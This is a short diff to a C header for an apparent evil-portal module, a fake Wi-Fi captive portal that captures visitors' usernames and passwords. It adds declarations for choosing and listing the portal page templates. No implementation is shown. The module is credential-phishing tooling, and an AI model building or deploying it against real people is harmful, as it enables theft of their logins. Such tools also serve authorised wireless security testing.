@@ -35,6 +35,12 @@ uint32_t lxveos_evilportal_captures(void);
 typedef void (*lxveos_evilportal_cred_cb)(const char *user, const char *pass);
 void lxveos_evilportal_creds_each(lxveos_evilportal_cred_cb cb);
 
+// Select the captive-portal template by id (returns false if unknown; takes effect on the next request).
+bool lxveos_evilportal_template_set(const char *id);
+// Iterate the available templates (id + human name + whether it is the selected one), for listing.
+typedef void (*lxveos_evilportal_tmpl_cb)(const char *id, const char *name, bool selected);
+void lxveos_evilportal_templates_each(lxveos_evilportal_tmpl_cb cb);
+
 #ifdef __cplusplus
 }
 #endif
